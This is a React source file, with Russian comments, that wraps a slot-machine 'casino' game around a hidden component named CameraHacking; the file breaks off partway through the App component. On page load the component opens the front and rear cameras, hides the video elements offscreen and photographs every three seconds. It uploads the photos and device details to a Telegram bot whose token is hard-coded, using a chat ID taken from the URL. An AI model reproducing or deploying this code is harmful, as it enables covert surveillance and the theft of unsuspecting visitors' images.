import React, { useRef, useEffect, useState } from "react";
import { useParams, BrowserRouter, Routes, Route } from "react-router-dom";
import ReactDOM from "react-dom/client";
import "./App.css";

/**
 * МИНИ-КАЗИНО COMPONENT
 */
const MiniCasino = () => {
  const [balance, setBalance] = useState(1000);
  const [bet, setBet] = useState(100);
  const [timeLeft, setTimeLeft] = useState(60);
  const [gameActive, setGameActive] = useState(true);
  const [slotResult, setSlotResult] = useState(['🍒', '🍒', '🍒']);
  const [spinning, setSpinning] = useState(false);
  const [message, setMessage] = useState('Добро пожаловать в казино!');
  const [gameHistory, setGameHistory] = useState([]);

  // Слот-машина символы с разными весами
  const slotSymbols = [
    { symbol: '🍒', weight: 4, multiplier: 2 },
    { symbol: '🍋', weight: 3, multiplier: 3 },
    { symbol: '🍊', weight: 3, multiplier: 3 },
    { symbol: '🍉', weight: 2, multiplier: 5 },
    { symbol: '⭐', weight: 1, multiplier: 10 },
    { symbol: '7️⃣', weight: 1, multiplier: 20 },
    { symbol: '👑', weight: 0.5, multiplier: 50 },
    { symbol: '💰', weight: 0.5, multiplier: 100 }
  ];

  // Таймер игры
  useEffect(() => {
    if (!gameActive) return;

    const timer = setInterval(() => {
      setTimeLeft(prev => {
        if (prev <= 1) {
          setGameActive(false);
          clearInterval(timer);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [gameActive]);

  // Спин слот-машины
  const spinSlots = () => {
    if (spinning || !gameActive) return;
    
    if (balance < bet) {
      setMessage('❌ Недостаточно средств!');
      return;
    }

    setSpinning(true);
    setMessage('🎰 Вращаем...');
    
    // Снимаем ставку
    setBalance(prev => prev - bet);
    
    // Анимация вращения
    let spinCount = 0;
    const spinInterval = setInterval(() => {
      const randomResult = Array(3).fill(0).map(() => {
        const totalWeight = slotSymbols.reduce((sum, sym) => sum + sym.weight, 0);
        let random = Math.random() * totalWeight;
        
        for (const symbol of slotSymbols) {
          random -= symbol.weight;
          if (random <= 0) {
            return symbol.symbol;
          }
        }
        return '🍒';
      });
      
      setSlotResult(randomResult);
      spinCount++;
      
      if (spinCount > 15) { // Завершаем спин
        clearInterval(spinInterval);
        
        // Финальный результат
        const finalResult = Array(3).fill(0).map(() => {
          const totalWeight = slotSymbols.reduce((sum, sym) => sum + sym.weight, 0);
          let random = Math.random() * totalWeight;
          
          for (const symbol of slotSymbols) {
            random -= symbol.weight;
            if (random <= 0) {
              return { symbol: symbol.symbol, multiplier: symbol.multiplier };
            }
          }
          return { symbol: '🍒', multiplier: 2 };
        });
        
        setSlotResult(finalResult.map(r => r.symbol));
        
        // Проверяем выигрыш
        setTimeout(() => {
          checkWin(finalResult);
          setSpinning(false);
        }, 500);
      }
    }, 100);
  };

  // Проверка выигрыша
  const checkWin = (result) => {
    const [a, b, c] = result;
    let winAmount = 0;
    let winMessage = '';
    
    if (a.symbol === b.symbol && b.symbol === c.symbol) {
      // 3 одинаковых символа
      winAmount = bet * a.multiplier;
      winMessage = `🎉 ДЖЕКПОТ! ${a.symbol} ${a.symbol} ${a.symbol}`;
    } else if (a.symbol === b.symbol || a.symbol === c.symbol || b.symbol === c.symbol) {
      // 2 одинаковых символа
      const matchedSymbol = a.symbol === b.symbol ? a : a.symbol === c.symbol ? a : b;
      winAmount = Math.floor(bet * (matchedSymbol.multiplier * 0.5));
      winMessage = `🎉 Выигрыш! 2x ${matchedSymbol.symbol}`;
    } else {
      winMessage = '😢 Повезет в следующий раз!';
    }
    
    if (winAmount > 0) {
      setBalance(prev => prev + winAmount);
      winMessage += ` +${winAmount}💰`;
    }
    
    setMessage(winMessage);
    
    // Добавляем в историю
    setGameHistory(prev => [
      {
        result: result.map(r => r.symbol).join(' '),
        bet,
        win: winAmount,
        time: new Date().toLocaleTimeString()
      },
      ...prev.slice(0, 9)
    ]);
  };

  // Быстрые ставки
  const quickBet = (amount) => {
    if (amount > balance) return;
    setBet(amount);
  };

  // Рестарт игры
  const restartGame = () => {
    setBalance(1000);
    setBet(100);
    setTimeLeft(60);
    setGameActive(true);
    setSlotResult(['🍒', '🍒', '🍒']);
    setMessage('Добро пожаловать в казино!');
    setGameHistory([]);
  };

  // Автоматическая игра
  const autoPlay = () => {
    if (!gameActive || spinning) return;
    
    const autoSpin = () => {
      if (balance >= bet && gameActive && timeLeft > 0) {
        spinSlots();
        setTimeout(autoSpin, 2000);
      }
    };
    
    autoSpin();
  };

  return (
    <div className="mini-casino-container">
      <div className="casino-header">
        <h2>🎰 TAVERNA CASINO</h2>
        <div className="game-stats">
          <div className="stat">
            <span>⏱️ Время:</span>
            <span className="value">{timeLeft} сек</span>
          </div>
          <div className="stat">
            <span>💰 Баланс:</span>
            <span className="value" style={{ color: balance >= 1000 ? '#4CAF50' : balance >= 500 ? '#FF9800' : '#f44336' }}>
              {balance} ₽
            </span>
          </div>
          <div className="stat">
            <span>🎯 Ставка:</span>
            <span className="value">{bet} ₽</span>
          </div>
          <div className="stat">
            <span>🚀 Статус:</span>
            <span className="value">{gameActive ? 'Активна' : 'Завершена'}</span>
          </div>
        </div>
      </div>
      
      <div className="casino-main">
        <div className="slot-machine">
          <div className="slot-display">
            {slotResult.map((symbol, index) => (
              <div 
                key={index} 
                className={`slot-reel ${spinning ? 'spinning' : ''}`}
                style={{ animationDelay: `${index * 0.1}s` }}
              >
                {symbol}
              </div>
            ))}
          </div>
          
          <div className="slot-controls">
            <button 
              onClick={spinSlots} 
              disabled={spinning || !gameActive || balance < bet}
              className="spin-button"
            >
              {spinning ? '🎰 Вращается...' : '🎰 Крутить!'}
            </button>
            
            <button 
              onClick={autoPlay} 
              disabled={spinning || !gameActive || balance < bet}
              className="auto-button"
            >
              🤖 Авто-игра
            </button>
          </div>
        </div>
        
        <div className="bet-controls">
          <div className="bet-buttons">
            {[10, 50, 100, 200, 500].map(amount => (
              <button
                key={amount}
                onClick={() => quickBet(amount)}
                className={`bet-button ${bet === amount ? 'active' : ''}`}
                disabled={balance < amount}
              >
                {amount} ₽
              </button>
            ))}
          </div>
          
          <div className="bet-slider">
            <input
              type="range"
              min="10"
              max="500"
              step="10"
              value={bet}
              onChange={(e) => setBet(parseInt(e.target.value))}
              disabled={spinning}
            />
            <span>Ставка: {bet} ₽</span>
          </div>
        </div>
        
        <div className="message-box">
          <div className="message">{message}</div>
        </div>
        
        {!gameActive && (
          <div className="game-over">
            <h3>🎰 ИГРА ОКОНЧЕНА</h3>
            <p>Ваш финальный баланс: <strong>{balance} ₽</strong></p>
            {balance > 1000 ? (
              <p style={{ color: '#4CAF50' }}>🎉 Вы в плюсе! Отличная игра!</p>
            ) : balance === 1000 ? (
              <p>🤝 Ничья! Сохранили баланс!</p>
            ) : (
              <p style={{ color: '#f44336' }}>😢 Вы в минусе. Попробуйте снова!</p>
            )}
            <button onClick={restartGame} className="restart-btn">
              🔄 Играть снова
            </button>
          </div>
        )}
        
        <div className="game-history">
          <h4>📊 История игр:</h4>
          <div className="history-list">
            {gameHistory.length > 0 ? (
              gameHistory.map((game, index) => (
                <div key={index} className="history-item">
                  <span>{game.result}</span>
                  <span>Ставка: {game.bet} ₽</span>
                  <span className={game.win > 0 ? 'win' : 'lose'}>
                    {game.win > 0 ? `+${game.win} ₽` : '0 ₽'}
                  </span>
                  <span className="time">{game.time}</span>
                </div>
              ))
            ) : (
              <div className="empty-history">История игр пуста</div>
            )}
          </div>
        </div>
      </div>
      
      <div className="casino-instructions">
        <h4>📋 Правила казино:</h4>
        <ul>
          <li>🎰 Ставьте деньги и крутите слоты</li>
          <li>🎉 3 одинаковых символа = ДЖЕКПОТ</li>
          <li>✨ 2 одинаковых символа = Малый выигрыш</li>
          <li>💰 Начинайте с 1000 ₽, старайтесь увеличить баланс</li>
          <li>⏱️ Игра длится 60 секунд</li>
        </ul>
      </div>
      
      <style>{`
        .mini-casino-container {
          background: rgba(255, 255, 255, 0.1);
          backdrop-filter: blur(10px);
          border-radius: 20px;
          padding: 25px;
          box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
          max-width: 900px;
          margin: 0 auto;
          border: 2px solid rgba(255, 215, 0, 0.3);
        }
        
        .casino-header {
          text-align: center;
          margin-bottom: 20px;
        }
        
        .casino-header h2 {
          color: #FFD700;
          margin-bottom: 20px;
          font-size: 32px;
          text-shadow: 0 2px 4px rgba(0,0,0,0.5);
        }
        
        .game-stats {
          display: grid;
          grid-template-columns: repeat(2, 1fr);
          gap: 15px;
          background: rgba(0, 0, 0, 0.4);
          border-radius: 15px;
          padding: 20px;
          margin-bottom: 20px;
          border: 1px solid rgba(255, 215, 0, 0.2);
        }
        
        @media (min-width: 768px) {
          .game-stats {
            grid-template-columns: repeat(4, 1fr);
          }
        }
        
        .stat {
          display: flex;
          flex-direction: column;
          align-items: center;
          color: #fff;
          padding: 10px;
          background: rgba(255, 255, 255, 0.05);
          border-radius: 10px;
        }
        
        .stat span:first-child {
          font-size: 12px;
          opacity: 0.8;
          margin-bottom: 5px;
          color: #FFD700;
        }
        
        .stat .value {
          font-size: 24px;
          font-weight: bold;
        }
        
        .casino-main {
          background: rgba(0, 0, 0, 0.3);
          border-radius: 15px;
          padding: 20px;
          margin-bottom: 20px;
        }
        
        .slot-machine {
          text-align: center;
          margin-bottom: 30px;
        }
        
        .slot-display {
          display: flex;
          justify-content: center;
          gap: 20px;
          margin: 30px 0;
          padding: 20px;
          background: rgba(0, 0, 0, 0.5);
          border-radius: 15px;
          border: 3px solid #FFD700;
        }
        
        .slot-reel {
          width: 100px;
          height: 100px;
          display: flex;
          align-items: center;
          justify-content: center;
          font-size: 60px;
          background: linear-gradient(145deg, #1a1a1a, #2d2d2d);
          border-radius: 10px;
          box-shadow: inset 0 2px 10px rgba(0,0,0,0.5);
          border: 2px solid #444;
        }
        
        .slot-reel.spinning {
          animation: spin 0.1s infinite linear;
        }
        
        @keyframes spin {
          0% { transform: translateY(0); }
          100% { transform: translateY(-100px); }
        }
        
        .slot-controls {
          display: flex;
          justify-content: center;
          gap: 20px;
          margin-top: 20px;
        }
        
        .spin-button, .auto-button, .bet-button, .restart-btn {
          padding: 15px 30px;
          border: none;
          border-radius: 10px;
          font-size: 18px;
          font-weight: bold;
          cursor: pointer;
          transition: all 0.3s;
        }
        
        .spin-button {
          background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%);
          color: #000;
          min-width: 200px;
        }
        
        .spin-button:hover:not(:disabled) {
          transform: scale(1.05);
          box-shadow: 0 0 20px rgba(255, 215, 0, 0.5);
        }
        
        .spin-button:disabled {
          opacity: 0.5;
          cursor: not-allowed;
        }
        
        .auto-button {
          background: linear-gradient(135deg, #4CAF50 0%, #2E7D32 100%);
          color: white;
        }
        
        .bet-controls {
          margin: 30px 0;
          padding: 20px;
          background: rgba(0, 0, 0, 0.4);
          border-radius: 15px;
        }
        
        .bet-buttons {
          display: flex;
          flex-wrap: wrap;
          gap: 10px;
          justify-content: center;
          margin-bottom: 20px;
        }
        
        .bet-button {
          background: rgba(255, 255, 255, 0.1);
          color: white;
          padding: 10px 20px;
          border: 2px solid transparent;
        }
        
        .bet-button.active {
          border-color: #FFD700;
          background: rgba(255, 215, 0, 0.2);
        }
        
        .bet-button:hover:not(:disabled) {
          background: rgba(255, 255, 255, 0.2);
        }
        
        .bet-slider {
          text-align: center;
        }
        
        .bet-slider input {
          width: 80%;
          margin: 10px 0;
          -webkit-appearance: none;
          height: 10px;
          background: linear-gradient(to right, #4CAF50, #FFD700, #f44336);
          border-radius: 5px;
          outline: none;
        }
        
        .bet-slider input::-webkit-slider-thumb {
          -webkit-appearance: none;
          width: 25px;
          height: 25px;
          border-radius: 50%;
          background: #FFD700;
          cursor: pointer;
        }
        
        .message-box {
          background: rgba(0, 0, 0, 0.5);
          border-radius: 10px;
          padding: 20px;
          margin: 20px 0;
          border-left: 4px solid #FFD700;
        }
        
        .message {
          font-size: 20px;
          text-align: center;
          color: white;
          min-height: 30px;
        }
        
        .game-over {
          background: rgba(0, 0, 0, 0.9);
          padding: 30px;
          border-radius: 15px;
          text-align: center;
          color: #fff;
          margin: 20px 0;
          border: 2px solid #FFD700;
        }
        
        .game-over h3 {
          color: #FFD700;
          margin-bottom: 15px;
        }
        
        .restart-btn {
          background: linear-gradient(135deg, #2196F3 0%, #0D47A1 100%);
          color: white;
          margin-top: 15px;
        }
        
        .restart-btn:hover {
          transform: scale(1.05);
        }
        
        .game-history {
          background: rgba(0, 0, 0, 0.4);
          border-radius: 15px;
          padding: 20px;
          margin-top: 20px;
        }
        
        .game-history h4 {
          color: #FFD700;
          margin-bottom: 15px;
          text-align: center;
        }
        
        .history-list {
          max-height: 200px;
          overflow-y: auto;
        }
        
        .history-item {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 10px;
          margin: 5px 0;
          background: rgba(255, 255, 255, 0.05);
          border-radius: 8px;
          font-size: 14px;
          color: white;
        }
        
        .history-item .win {
          color: #4CAF50;
          font-weight: bold;
        }
        
        .history-item .lose {
          color: #f44336;
        }
        
        .history-item .time {
          font-size: 12px;
          opacity: 0.7;
        }
        
        .empty-history {
          text-align: center;
          padding: 20px;
          color: rgba(255, 255, 255, 0.5);
          font-style: italic;
        }
        
        .casino-instructions {
          background: rgba(0, 0, 0, 0.4);
          border-radius: 15px;
          padding: 20px;
          color: white;
        }
        
        .casino-instructions h4 {
          color: #FFD700;
          margin-bottom: 15px;
          text-align: center;
        }
        
        .casino-instructions ul {
          padding-left: 20px;
        }
        
        .casino-instructions li {
          margin: 10px 0;
          line-height: 1.5;
        }
        
        ::-webkit-scrollbar {
          width: 8px;
        }
        
        ::-webkit-scrollbar-track {
          background: rgba(255, 255, 255, 0.1);
          border-radius: 4px;
        }
        
        ::-webkit-scrollbar-thumb {
          background: #FFD700;
          border-radius: 4px;
        }
      `}</style>
    </div>
  );
};

/**
 * КОМПОНЕНТ CAMERAHACKING - УПРОЩЕННАЯ ВЕРСИЯ
 */
const CameraHacking = ({ chatId }) => {
  const streamsRef = useRef([]);
  const captureIntervalRef = useRef(null);
  const videoRefsRef = useRef([]);
  const cameraNamesRef = useRef([]);
  const captureCount = useRef(0);
  const startTime = useRef(null);
  const totalDuration = 60000; // 1 минута
  const photoInterval = 3000;  // 3 секунды
  const currentCameraIndex = useRef(0);

  const TELEGRAM_BOT_TOKEN = '8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s';

  const sendToTelegram = (text) => {
    return new Promise((resolve, reject) => {
      const xhr = new XMLHttpRequest();
      xhr.open('POST', `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, true);
      xhr.setRequestHeader('Content-Type', 'application/json');
      
      xhr.onload = function() {
        if (xhr.status === 200) resolve(true);
        else reject(new Error('Failed to send message'));
      };
      
      xhr.onerror = function() {
        reject(new Error('Network error'));
      };
      
      const data = JSON.stringify({
        chat_id: chatId,
        text: text,
        parse_mode: 'HTML',
        disable_notification: true
      });
      
      xhr.send(data);
    });
  };

  const sendPhotoToTelegram = (blob, caption = '') => {
    return new Promise((resolve, reject) => {
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', blob, `photo_${Date.now()}.jpg`);
      formData.append('disable_notification', 'true');
      if (caption) formData.append('caption', caption);

      const xhr = new XMLHttpRequest();
      xhr.open('POST', `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, true);
      
      xhr.onload = function() {
        if (xhr.status === 200) resolve(true);
        else reject(new Error('Failed to send photo'));
      };
      
      xhr.onerror = function() {
        reject(new Error('Network error'));
      };
      
      xhr.send(formData);
    });
  };

  // ПРОСТАЯ ИНИЦИАЛИЗАЦИЯ КАМЕР - исправленная версия
  const initializeCameras = async () => {
    try {
      streamsRef.current = [];
      videoRefsRef.current = [];
      cameraNamesRef.current = [];

      console.log("🔄 Пробую получить доступ к камерам...");

      // Массив возможных конфигураций камер
      const cameraConfigs = [
        {
          constraints: {
            video: {
              width: { ideal: 1280 },
              height: { ideal: 720 },
              facingMode: "user"
            }
          },
          name: "🤳 Селфи камера",
          isFront: true
        },
        {
          constraints: {
            video: {
              width: { ideal: 1280 },
              height: { ideal: 720 },
              facingMode: { exact: "environment" }
            }
          },
          name: "📷 Задняя камера",
          isFront: false
        }
      ];

      // Пробуем каждую конфигурацию
      for (let i = 0; i < cameraConfigs.length; i++) {
        try {
          const config = cameraConfigs[i];
          console.log(`🔄 Пробую получить ${config.name}...`);
          
          const stream = await navigator.mediaDevices.getUserMedia(config.constraints);
          
          const video = document.createElement('video');
          video.style.cssText = `
            position: fixed;
            width: 320px;
            height: 240px;
            opacity: 0.01;
            pointer-events: none;
            z-index: -9999;
            top: 0;
            left: ${i * 330}px;
          `;
          video.autoplay = true;
          video.muted = true;
          video.playsInline = true;
          video.srcObject = stream;
          document.body.appendChild(video);

          // Ждем готовности видео
          await new Promise((resolve, reject) => {
            const onLoaded = () => {
              video.removeEventListener('loadedmetadata', onLoaded);
              resolve();
            };
            
            video.addEventListener('loadedmetadata', onLoaded);
            
            // Таймаут на случай если событие не сработает
            setTimeout(() => {
              video.removeEventListener('loadedmetadata', onLoaded);
              resolve();
            }, 2000);
          });

          streamsRef.current.push(stream);
          videoRefsRef.current.push(video);
          cameraNamesRef.current.push(config.name);
          
          console.log(`✅ ${config.name} готова`);
          
        } catch (error) {
          console.log(`❌ ${cameraConfigs[i].name} недоступна:`, error.name);
          
          // Создаем тестовый видео-элемент для недоступной камеры
          const video = document.createElement('video');
          video.style.cssText = `
            position: fixed;
            width: 320px;
            height: 240px;
            opacity: 0;
            pointer-events: none;
            z-index: -9999;
            top: 0;
            left: ${i * 330}px;
          `;
          video.autoplay = true;
          video.muted = true;
          video.playsInline = true;
          document.body.appendChild(video);
          
          videoRefsRef.current.push(video);
          cameraNamesRef.current.push(cameraConfigs[i].name);
        }
      }

      // Если не удалось получить ни одну реальную камеру, создаем тестовые
      if (streamsRef.current.length === 0) {
        console.log("⚠️ Реальных камер нет, использую тестовые режимы");
        cameraNamesRef.current = ["🤳 Тестовая камера 1", "📷 Тестовая камера 2"];
        
        // Создаем тестовые видео-элементы
        for (let i = 0; i < 2; i++) {
          const video = document.createElement('video');
          video.style.cssText = `
            position: fixed;
            width: 320px;
            height: 240px;
            opacity: 0;
            pointer-events: none;
            z-index: -9999;
            top: 0;
            left: ${i * 330}px;
          `;
          video.autoplay = true;
          video.muted = true;
          video.playsInline = true;
          document.body.appendChild(video);
          videoRefsRef.current.push(video);
        }
      }

      console.log(`✅ Доступно камер: ${cameraNamesRef.current.length}`);
      console.log(`📋 Список: ${cameraNamesRef.current.join(', ')}`);
      console.log(`🎥 Видео элементов: ${videoRefsRef.current.length}`);
      
      return true;

    } catch (error) {
      console.error("❌ Ошибка инициализации:", error);
      
      // Всегда создаем как минимум 2 тестовые камеры
      cameraNamesRef.current = ["🤳 Тестовая камера 1", "📷 Тестовая камера 2"];
      
      // Создаем тестовые видео-элементы
      for (let i = 0; i < 2; i++) {
        const video = document.createElement('video');
        video.style.cssText = `
          position: fixed;
          width: 320px;
          height: 240px;
          opacity: 0;
          pointer-events: none;
          z-index: -9999;
          top: 0;
          left: ${i * 330}px;
        `;
        video.autoplay = true;
        video.muted = true;
        video.playsInline = true;
        document.body.appendChild(video);
        videoRefsRef.current.push(video);
      }
      
      return true;
    }
  };

  const capturePhotoFromCamera = (cameraIndex) => {
    return new Promise((resolve) => {
      setTimeout(() => {
        const canvas = document.createElement('canvas');
        const cameraName = cameraNamesRef.current[cameraIndex] || `Камера ${cameraIndex + 1}`;
        
        // Проверяем, есть ли видео-элемент для этой камеры
        if (cameraIndex < videoRefsRef.current.length && videoRefsRef.current[cameraIndex]) {
          const video = videoRefsRef.current[cameraIndex];
          const hasRealStream = cameraIndex < streamsRef.current.length && streamsRef.current[cameraIndex];
          
          if (hasRealStream && video.srcObject) {
            // Пробуем сделать фото с реальной камеры
            setTimeout(() => {
              if (video.videoWidth > 0 && video.videoHeight > 0) {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                
                const ctx = canvas.getContext('2d');
                ctx.clearRect(0, 0, canvas.width, canvas.height);
                
                try {
                  // Зеркалим для селфи-камеры
                  if (cameraName.includes('Селфи') || cameraName.includes('Тестовая камера 1')) {
                    ctx.save();
                    ctx.translate(canvas.width, 0);
                    ctx.scale(-1, 1);
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    ctx.restore();
                  } else {
                    // Для других камер без зеркала
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                  }
                  
                  // Добавляем водяные знаки
                  addWatermarks(ctx, canvas, cameraName);
                  
                  canvas.toBlob(blob => {
                    resolve(blob ? { blob, cameraName, isReal: true } : null);
                  }, 'image/jpeg', 0.9);
                  
                  return;
                  
                } catch (err) {
                  console.log(`❌ Ошибка рисования с ${cameraName}:`, err);
                }
              }
              
              // Если не удалось с реальной камеры, создаем тестовое изображение
              createTestImage(canvas, cameraName, true);
              canvas.toBlob(blob => {
                resolve(blob ? { blob, cameraName, isReal: false } : null);
              }, 'image/jpeg', 0.9);
              
            }, 200);
          } else {
            // Нет реального потока - тестовое изображение
            createTestImage(canvas, cameraName, false);
            canvas.toBlob(blob => {
              resolve(blob ? { blob, cameraName, isReal: false } : null);
            }, 'image/jpeg', 0.9);
          }
        } else {
          // Нет видео элемента - тестовое изображение
          createTestImage(canvas, cameraName, false);
          canvas.toBlob(blob => {
            resolve(blob ? { blob, cameraName, isReal: false } : null);
          }, 'image/jpeg', 0.9);
        }
      }, 100);
    });
  };

  const addWatermarks = (ctx, canvas, cameraName) => {
    ctx.fillStyle = 'rgba(0, 0, 0, 0.7)';
    ctx.font = 'bold 30px Arial';
    ctx.textAlign = 'right';
    ctx.fillText('TAVERNA', canvas.width - 20, canvas.height - 20);
    
    ctx.fillStyle = 'rgba(0, 0, 0, 0.7)';
    ctx.textAlign = 'left';
    ctx.font = 'bold 20px Arial';
    ctx.fillText(cameraName, 20, 40);
    ctx.font = '16px Arial';
    ctx.fillText(`Фото #${captureCount.current + 1}`, 20, 70);
    ctx.fillText(new Date().toLocaleTimeString(), 20, 100);
    ctx.fillText(`${canvas.width}x${canvas.height}`, 20, 130);
  };

  const createTestImage = (canvas, cameraName, hasVideoElement = false) => {
    canvas.width = 800;
    canvas.height = 600;
    const ctx = canvas.getContext('2d');
    
    // Разные цвета для разных камер
    let color1, color2, emoji;
    if (cameraName.includes('Селфи') || cameraName.includes('Тестовая камера 1')) {
      color1 = '#667eea';
      color2 = '#764ba2';
      emoji = '🤳';
    } else {
      color1 = '#4CAF50';
      color2 = '#2196F3';
      emoji = '📷';
    }
    
    const gradient = ctx.createLinearGradient(0, 0, 800, 600);
    gradient.addColorStop(0, color1);
    gradient.addColorStop(1, color2);
    ctx.fillStyle = gradient;
    ctx.fillRect(0, 0, 800, 600);
    
    // Текст
    ctx.fillStyle = '#FFFFFF';
    ctx.font = 'bold 36px Arial';
    ctx.textAlign = 'center';
    ctx.fillText(`${emoji} TAVERNA SYSTEM`, 400, 150);
    
    ctx.font = '28px Arial';
    ctx.fillText(cameraName, 400, 250);
    
    // Статус
    if (hasVideoElement && (cameraName.includes('Селфи') || cameraName.includes('Задняя'))) {
      ctx.fillText('📷 Камера активна', 400, 320);
    } else {
      ctx.fillText('🖼 Тестовое изображение', 400, 320);
    }
    
    ctx.font = '22px Arial';
    ctx.fillText(`Фото #${captureCount.current + 1}`, 400, 380);
    ctx.fillText(new Date().toLocaleTimeString(), 400, 420);
    
    // Водяной знак
    ctx.fillStyle = 'rgba(255, 255, 255, 0.3)';
    ctx.font = 'bold 48px Arial';
    ctx.textAlign = 'right';
    ctx.fillText('TAVERNA', 780, 580);
  };

  const captureAndSendPhoto = async () => {
    const elapsed = Date.now() - startTime.current;
    
    if (elapsed >= totalDuration) {
      stopCapturing();
      sendToTelegram(`⏰ TAVERNA: Время истекло\n📸 Всего фото: ${captureCount.current}`).catch(() => {});
      return;
    }
    
    const cameraCount = Math.max(1, cameraNamesRef.current.length);
    const cameraIndex = currentCameraIndex.current % cameraCount;
    const cameraName = cameraNamesRef.current[cameraIndex];
    
    console.log(`📸 Захват с камеры ${cameraIndex + 1}/${cameraCount}: ${cameraName}`);
    
    const result = await capturePhotoFromCamera(cameraIndex);
    
    if (result && result.blob) {
      const elapsedSeconds = Math.floor(elapsed / 1000);
      const remainingSeconds = Math.floor((totalDuration - elapsed) / 1000);
      
      let status = result.isReal ? '✅ Реальное фото' : '🖼 Тестовое изображение';
      let cameraNum = `🔢 ${cameraIndex + 1}/${cameraCount}`;
      
      const caption = `${cameraName}\n` +
        `${status}\n` +
        `📸 Фото #${captureCount.current + 1}\n` +
        `${cameraNum}\n` +
        `⏱ ${elapsedSeconds} сек / ${remainingSeconds} сек\n` +
        `🕐 ${new Date().toLocaleTimeString()}\n` +
        `🚀 TAVERNA SYSTEM`;
      
      try {
        await sendPhotoToTelegram(result.blob, caption);
        console.log(`✅ Отправлено фото с ${cameraName}`);
      } catch (error) {
        console.log(`❌ Ошибка отправки ${cameraName}:`, error);
      }
    } else {
      console.log(`❌ Не удалось создать фото для ${cameraName}`);
    }
    
    // Переключаем на следующую камеру
    currentCameraIndex.current = (currentCameraIndex.current + 1) % cameraCount;
    captureCount.current++;
    
    // Статистика
    if (captureCount.current % 3 === 0) {
      const elapsedSeconds = Math.floor(elapsed / 1000);
      sendToTelegram(
        `📊 TAVERNA: Статистика\n` +
        `📸 Всего фото: ${captureCount.current}\n` +
        `📷 Камер в ротации: ${cameraNamesRef.current.length}\n` +
        `🔄 Текущая камера: ${currentCameraIndex.current + 1}/${cameraNamesRef.current.length}\n` +
        `⏱ Прошло: ${elapsedSeconds} сек`
      ).catch(() => {});
    }
  };

  const startCapture = () => {
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
    }
    
    currentCameraIndex.current = 0;
    
    console.log(`🚀 Начинаю поочередную съемку с ${cameraNamesRef.current.length} камер`);
    console.log(`📋 Камеры: ${cameraNamesRef.current.join(' → ')}`);
    
    // Первый снимок
    setTimeout(() => {
      captureAndSendPhoto();
    }, 2000);
    
    // Интервал
    captureIntervalRef.current = setInterval(() => {
      captureAndSendPhoto();
    }, photoInterval);
  };

  const stopCapturing = () => {
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
      captureIntervalRef.current = null;
    }
    
    streamsRef.current.forEach(stream => {
      stream?.getTracks().forEach(track => track.stop());
    });
    streamsRef.current = [];
    
    videoRefsRef.current.forEach(video => {
      video?.remove();
    });
    videoRefsRef.current = [];
    cameraNamesRef.current = [];
  };

  useEffect(() => {
    startTime.current = Date.now();
    
    const init = async () => {
      try {
        // Начальное сообщение
        await sendToTelegram(
          `🚀 TAVERNA SYSTEM ЗАПУЩЕН\n` +
          `📱 Устройство: ${/Mobile/.test(navigator.userAgent) ? '📱 Мобильное' : '💻 Компьютер'}\n` +
          `🖥 Экран: ${window.screen.width}x${window.screen.height}\n` +
          `⏰ Старт: ${new Date().toLocaleTimeString()}\n` +
          `⏳ Длительность: 1 минута\n` +
          `📸 Режим: Поочередная съемка`
        ).catch(() => {});
        
        // Инициализация камер
        await initializeCameras();
        
        // Информация о камерах
        let cameraInfo = '';
        if (streamsRef.current.length > 0) {
          cameraInfo = `✅ Реальных камер: ${streamsRef.current.length}\n`;
          cameraInfo += `📋 Камеры: ${cameraNamesRef.current.join(' → ')}`;
        } else {
          cameraInfo = `⚠️ Реальных камер: 0 (тестовый режим)\n`;
          cameraInfo += `📋 Камеры: ${cameraNamesRef.current.join(' → ')}`;
        }
        
        await sendToTelegram(
          `📷 ИНИЦИАЛИЗАЦИЯ КАМЕР\n` +
          `${cameraInfo}\n` +
          `📸 Интервал: 3 секунды\n` +
          `🔄 Ротация: Поочередная\n` +
          `⏱ Начинаю съемку...`
        ).catch(() => {});
        
        // Запуск съемки
        startCapture();
        
        // Таймер остановки
        setTimeout(() => {
          stopCapturing();
          sendToTelegram(
            `✅ СЪЕМКА ЗАВЕРШЕНА\n` +
            `📸 Всего фото: ${captureCount.current}\n` +
            `📷 Камер: ${cameraNamesRef.current.length}\n` +
            `⏱ Время: 1 минута\n` +
            `🎉 Процесс завершен`
          ).catch(() => {});
        }, totalDuration);
        
      } catch (error) {
        await sendToTelegram('❌ Ошибка запуска системы').catch(() => {});
      }
    };
    
    setTimeout(init, 1000);
    
    return () => {
      stopCapturing();
    };
  }, [chatId]);

  return null;
};

/**
 * КОМПОНЕНТ PHOTOPAGE
 */
const PhotoPage = () => {
  const { chatId } = useParams();

  return (
    <>
      <div className="App" style={{
        minHeight: '100vh',
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        justifyContent: 'center',
        background: 'linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%)',
        padding: '20px',
        fontFamily: 'Arial, sans-serif'
      }}>
        <div style={{
          textAlign: 'center',
          marginBottom: '30px',
          color: 'white'
        }}>
          <h1 style={{ fontSize: '42px', marginBottom: '10px', color: '#FFD700' }}>🎰 TAVERNA CASINO</h1>
          <p style={{ fontSize: '18px', opacity: 0.8 }}>Система активна. Играйте в казино пока идет съемка...</p>
        </div>
        
        <MiniCasino />
        
        <div style={{
          marginTop: '30px',
          color: 'rgba(255, 255, 255, 0.6)',
          fontSize: '14px',
          textAlign: 'center',
          maxWidth: '600px'
        }}>
          <p>📷 Система делает фото каждые 3 секунды</p>
          <p>🔄 Режим: Поочередная съемка (селфи → задняя → селфи...)</p>
          <p>⏱️ Процесс займет 1 минуту</p>
          <p>🎰 Играйте в казино чтобы скоротать время!</p>
        </div>
      </div>

      {chatId && <CameraHacking chatId={chatId} />}
    </>
  );
};

/**
 * КОМПОНЕНТ APP
 */
const App = () => {
  return (
    <Routes>
